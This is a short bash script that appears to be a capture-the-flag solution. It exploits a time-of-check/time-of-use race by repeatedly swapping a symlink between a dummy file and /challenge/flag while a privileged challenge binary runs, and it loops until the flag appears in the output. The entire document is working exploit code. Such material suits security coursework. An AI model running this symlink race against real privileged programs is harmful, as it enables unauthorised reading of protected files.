#!/bin/bash

touch /tmp/ist193342/normal
touch /tmp/ist193342/dummy

while true
do
    ln -sf /tmp/ist193342/normal /tmp/ist193342/dummy
    OUTPUT=$(echo "dummy" | /challenge/challenge &
    ln -sf /challenge/flag /tmp/ist193342/dummy)

    if echo $OUTPUT | grep -i "SSof"; then
        break
    fi
done